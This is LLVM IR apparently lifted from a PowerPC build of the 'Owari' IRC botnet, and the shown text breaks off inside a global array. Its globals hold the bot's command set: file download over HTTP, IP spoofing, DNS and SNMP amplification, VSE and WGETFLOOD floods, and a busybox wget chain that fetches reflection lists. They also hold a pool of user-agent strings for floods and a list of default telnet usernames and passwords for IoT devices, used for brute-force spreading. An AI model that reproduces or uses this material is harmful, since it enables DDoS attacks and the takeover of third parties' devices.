source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%3 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r12 = internal unnamed_addr global i32 0
@r16 = internal unnamed_addr global i32 0
@r17 = internal unnamed_addr global i32 0
@r18 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_100400c8.12 = global i32 0
@global_var_100400e4.13 = local_unnamed_addr global i32* @global_var_100400c8.12
@global_var_10030000.14 = constant [29 x i8] c"erver can't decode arguments\00"
@global_var_100452bc.17 = global i32 0
@global_var_100400cc.18 = global i32 0
@global_var_10010000.20 = constant i32 1208007189
@global_var_1002a064.21 = constant [8 x i8] c"POWERPC\00"
@global_var_100452d4.22 = global i32 0
@global_var_1004519c.24 = local_unnamed_addr global i32 0
@global_var_1002a06c.25 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_10000650.26 = constant i32 939524097
@global_var_1004517c.27 = local_unnamed_addr global i32 0
@global_var_100451cc.28 = local_unnamed_addr global i32 0
@global_var_10045178.30 = local_unnamed_addr global i32 0
@global_var_1002a08c.31 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_10045190.32 = local_unnamed_addr global i32 0
@global_var_1002a0cc.33 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d68.34 = constant [3 x i8] c"8`\00"
@global_var_1002a0e8.35 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f80.36 = constant [3 x i8] c"8`\00"
@global_var_10000f88.37 = constant [3 x i8] c"8`\00"
@global_var_1002a10c.38 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fc8.39 = constant [3 x i8] c"8`\00"
@global_var_1002a134.40 = constant [8 x i8] c"http://\00"
@global_var_1000101c.41 = constant i32 1207959584
@global_var_1000103c.42 = constant i32 939524096
@global_var_1002a13c.43 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001114.44 = constant [3 x i8] c"8`\00"
@global_var_1000111c.45 = constant [3 x i8] c"9?\00"
@global_var_1000114c.46 = constant i32 1207959564
@global_var_1002a164.47 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011a8.48 = constant [3 x i8] c"8`\00"
@global_var_1002a18c.49 = constant [276 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1002a2a0.50 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_1002a2bc.51 = constant [3 x i8] c"wb\00"
@global_var_1002a2c0.52 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001334.53 = constant i32 1207959588
@global_var_1002a2c8.54 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_10001498.55 = constant i32 1207959588
@global_var_100014ec.56 = constant [3 x i8] c"8`\00"
@global_var_1002a2e0.57 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015e4.58 = constant i32 1207959756
@global_var_1002a300.59 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_1002a330.60 = constant [70 x i8] c"NOTICE %s :Owari net version: 3 by Kuze-senpai, Milenko and Morpheus\0A\00"
@global_var_1002a378.61 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001770.62 = constant i32 1207959672
@global_var_1002a390.63 = constant [54 x i8] c"NOTICE %s :Nick cannot be larger than 32 characters.\0A\00"
@global_var_100017ac.64 = constant i32 1207959612
@global_var_10045198.65 = local_unnamed_addr global i32 0
@global_var_1002a3c8.66 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_1002a3d4.67 = constant [16 x i8] c"NICK [%s|%s]%s\0A\00"
@global_var_1002a3e4.68 = constant [8 x i8] c"GIGANET\00"
@global_var_1002a3ec.69 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_1002a408.70 = constant [9 x i8] c"Disabled\00"
@global_var_1002a414.71 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_1002a430.72 = constant [34 x i8] c"NOTICE %s :Current status is: %s\0A\00"
@global_var_100019b4.73 = constant i32 1207959752
@global_var_1002a454.74 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100019e4.75 = constant i32 1207959704
@global_var_1002a474.76 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_10001a20.77 = constant i32 1207959644
@global_var_1004db70.78 = global i32 0
@global_var_1002a49c.79 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1002a4bc.80 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001b28.81 = constant i32 1207959708
@global_var_1002a4d8.82 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001b58.83 = constant i32 1207959660
@global_var_1002a4f8.84 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001b9c.85 = constant i32 1207959592
@global_var_1002a514.86 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1002a534.87 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_1002a554.88 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001c7c.89 = constant i32 1207959964
@global_var_10045180.92 = global i32 0
@global_var_1002a5a4.93 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001eb8.94 = constant [3 x i8] c"8`\00"
@global_var_100456d4.95 = global i32 0
@global_var_100456d8.96 = local_unnamed_addr global i32 0
@global_var_100456dc.97 = local_unnamed_addr global i32 0
@global_var_10040758.98 = local_unnamed_addr global i32 4095
@global_var_10040754.99 = local_unnamed_addr global i32 362436
@global_var_100024f4.100 = constant [3 x i8] c"8`\00"
@global_var_1002a5c8.101 = constant [14 x i8] c"192.168.3.100\00"
@global_var_100027f8.102 = constant i32 939524096
@global_var_1000283c.103 = constant i32 939524096
@global_var_10002c80.105 = constant i32 939524096
@global_var_100451b4.106 = local_unnamed_addr global i32 0
@global_var_1002a5f8.107 = constant [67 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\0A\00"
@global_var_1002a63c.108 = constant [171 x i8] c"wget \22%s\22 -q -O DNS.txt || busybox wget \22%s\22 -O DNS.txt || /bin/busybox wget \22%s\22 -O DNS.txt || /usr/busybox wget \22%s\22 -O DNS.txt || /var/run/busybox wget \22%s\22 -O DNS.txt\00"
@global_var_10003160.109 = constant i32 939524096
@global_var_1002a6e8.110 = constant [8 x i8] c"DNS.txt\00"
@1 = constant i32 1912602624
@global_var_1002a6f4.112 = constant [36 x i8] c"NOTICE %s :DNS amp attacking %s:%s\0A\00"
@global_var_100033b4.113 = constant [3 x i8] c"8`\00"
@global_var_1002a718.114 = constant i32 1157627971
@global_var_10003460.115 = constant [3 x i8] c"8`\00"
@global_var_1002a75c.116 = constant [13 x i8] c"192.168.1.83\00"
@global_var_100035f0.117 = constant [3 x i8] c"8`\00"
@global_var_10003718.118 = constant [3 x i8] c"8`\00"
@global_var_1000372c.119 = constant [3 x i8] c"9 \00"
@global_var_100451ac.120 = local_unnamed_addr global i32 0
@global_var_10045194.121 = local_unnamed_addr global i32 0
@global_var_100450d4.122 = local_unnamed_addr global i32 83
@global_var_1002a76c.123 = constant [99 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1002a7d0.124 = constant [176 x i8] c"wget \22%s\22 -q -O SNMP.txt || busybox wget \22%s\22 -O SNMP.txt || /bin/busybox wget \22%s\22 -O SNMP.txt || /usr/busybox wget \22%s\22 -O SNMP.txt || /var/run/busybox wget \22%s\22 -O SNMP.txt\00"
@global_var_10003970.125 = constant [3 x i8] c"8`\00"
@global_var_10003984.126 = constant i32 939524096
@global_var_1002a880.127 = constant [9 x i8] c"SNMP.txt\00"
@global_var_1002a88c.128 = constant [37 x i8] c"NOTICE %s :SNMP amp attacking %s:%s\0A\00"
@global_var_10003d4c.129 = constant i32 939524096
@global_var_10003fac.130 = constant [3 x i8] c"8`\00"
@global_var_1002a8b4.131 = constant [89 x i8] c"NOTICE %s :VSE <target IP> <target port> <thread> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1000412c.132 = constant [3 x i8] c"8`\00"
@global_var_10004178.133 = constant i32 939524096
@global_var_1002a910.134 = constant [32 x i8] c"NOTICE %s :VSE attacking %s:%s\0A\00"
@global_var_100043ac.135 = constant i32 939524096
@global_var_1002a930.136 = constant [35 x i8] c"NOTICE %s :WGETFLOOD <url> <secs>\0A\00"
@global_var_10004548.137 = constant [3 x i8] c"8`\00"
@global_var_10028dc8.138 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10028e14.139 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_10028e68.140 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10028ec0.141 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_10028f18.142 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10028f58.143 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_10028fa0.144 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_10028ff8.145 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_10029064.146 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_100290bc.147 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_1002910c.148 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_10029130.149 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1002918c.150 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1002919c.151 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_100291cc.152 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_100291f0.153 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_10029214.154 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_10029230.155 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10029270.156 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_100292c0.157 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1002930c.158 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_10029348.159 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_100293a4.160 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_1002940c.161 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_10029480.162 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_100294f8.163 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_10029554.164 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_100295a8.165 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_10029630.166 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10029684.167 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_100296ec.168 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_10029748.169 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_10029798.170 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_100297dc.171 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_10029830.172 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_1002987c.173 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_100298c0.174 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_10029914.175 = constant [123 x i8] c"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6\00"
@global_var_10029990.176 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_100299fc.177 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_10029a6c.178 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_10029ac8.179 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_10029b3c.180 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_10029bac.181 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_10029c44.182 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_10029c90.183 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_10029cf8.184 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_10029d34.185 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_10029d64.186 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_10029da4.187 = constant [5 x i8] c"root\00"
@global_var_10029dac.188 = constant [6 x i8] c"admin\00"
@global_var_10029db4.189 = constant [6 x i8] c"guest\00"
@global_var_10029dbc.190 = constant [8 x i8] c"default\00"
@global_var_10029dc8.191 = constant [5 x i8] c"user\00"
@global_var_10029dd0.192 = constant [7 x i8] c"daemon\00"
@global_var_10029dd8.193 = constant [4 x i8] c"adm\00"
@global_var_10029de0.194 = constant [7 x i8] c"telnet\00"
@global_var_10029de8.195 = constant [14 x i8] c"Administrator\00"
@global_var_10029df8.196 = constant [7 x i8] c"mg3500\00"
@global_var_10029e00.197 = constant [7 x i8] c"admin1\00"
@global_var_10029e08.198 = constant [5 x i8] c"ubnt\00"
@global_var_10029e10.199 = constant [8 x i8] c"support\00"
@global_var_10029e1c.200 = constant i32 0
@global_var_10029e20.201 = constant [7 x i8] c"000000\00"
@global_var_10029e28.202 = constant [6 x i8] c"14567\00"
@global_var_10029e30.203 = constant [7 x i8] c"hi3518\00"
@global_var_10029e38.204 = constant [5 x i8] c"pass\00"
@global_var_10029e40.205 = constant [8 x i8] c"admin14\00"
@global_var_10029e4c.206 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_10029e5c.207 = constant [9 x i8] c"00000000\00"
@global_var_10029e68.208 = constant [3 x i8] c"<>\00"
@global_var_10029e6c.209 = constant [5 x i8] c"klv1\00"
@global_var_10029e74.210 = constant [6 x i8] c"klv14\00"
@global_var_10029e7c.211 = constant [9 x i8] c"oelinux1\00"
@global_var_10029e88.212 = constant [8 x i8] c"realtek\00"
@global_var_10029e94.213 = constant [5 x i8] c"1111\00"
@global_var_10029e9c.214 = constant [6 x i8] c"54321\00"
@global_var_10029ea4.215 = constant [7 x i8] c"antslq\00"
@global_var_10029eac.216 = constant [8 x i8] c"zte9x15\00"
@global_var_10029eb8.217 = constant [7 x i8] c"system\00"
@global_var_10029ec0.218 = constant [5 x i8] c"1456\00"
@global_var_10029ec8.219 = constant [7 x i8] c"888888\00"
@global_var_10029ed0.220 = constant [5 x i8] c"ikwb\00"
@global_var_10029ed8.221 = constant [9 x i8] c"password\00"
@global_var_10029ee4.222 = constant [9 x i8] c"juantech\00"
@global_var_10029ef0.223 = constant [7 x i8] c"Zte521\00"
@global_var_10029ef8.224 = constant [7 x i8] c"xc3511\00"
@global_var_10029f00.225 = constant [8 x i8] c"1111111\00"
@global_var_10029f0c.226 = constant [8 x i8] c"service\00"
@global_var_10029f18.227 = constant [4 x i8] c"145\00"
@global_var_10029f20.228 = constant [5 x i8] c"4321\00"
@global_var_10029f28.229 = constant [5 x i8] c"tech\00"
@global_var_10029f30.230 = constant [5 x i8] c"abc1\00"
@global_var_10029f38.231 = constant [7 x i8] c"switch\00"
@global_var_10029f40.232 = constant [7 x i8] c"meinsm\00"
@global_var_10029f48.233 = constant [9 x i8] c"smcadmin\00"
@global_var_10029f54.234 = constant [9 x i8] c"14567890\00"
@global_var_10029f60.235 = constant [3 x i8] c"14\00"
@global_var_10029f64.236 = constant [5 x i8] c"anko\00"
@global_var_10029f6c.237 = constant [7 x i8] c"merlin\00"
@global_var_10029f74.238 = constant [6 x i8] c"zlxx.\00"
@global_var_10029f7c.239 = constant i32 973078528
@global_var_10029f80.240 = constant [4 x i8] c"ser\00"
@global_var_10029f84.241 = constant [5 x i8] c"ogin\00"
@global_var_10029f8c.242 = constant [5 x i8] c"name\00"
@global_var_10029f94.243 = constant [5 x i8] c"pass\00"
@global_var_10029f9c.244 = constant [7 x i8] c"dvrdvs\00"
@global_var_100402b4.245 = global [255 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10028dc8.138, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10028e14.139, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10028e68.140, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10028ec0.141, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10028f18.142, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10028f58.143, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10028fa0.144, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_10028ff8.145, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_10029064.146, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_100290bc.147, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_1002910c.148, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_10029130.149, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1002918c.150, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1002919c.151, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_100291cc.152, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100291f0.153, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_10029214.154, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_10029230.155, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10029270.156, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100292c0.157, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @global_var_1002930c.158, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @global_var_10029348.159, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_100293a4.160, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1002940c.161, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_10029480.162, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100294f8.163, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_10029554.164, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @global_var_100295a8.165, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10029630.166, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_10029684.167, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_100296ec.168, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10029748.169, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_10029798.170, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_100297dc.171, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_10029830.172, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1002987c.173, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_100298c0.174, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_10029914.175, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_10029990.176, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_100299fc.177, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10029a6c.178, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_10029ac8.179, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_10029b3c.180, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_10029bac.181, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_10029c44.182, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_10029c90.183, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @global_var_10029cf8.184, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_10029d34.185, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10029d64.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x 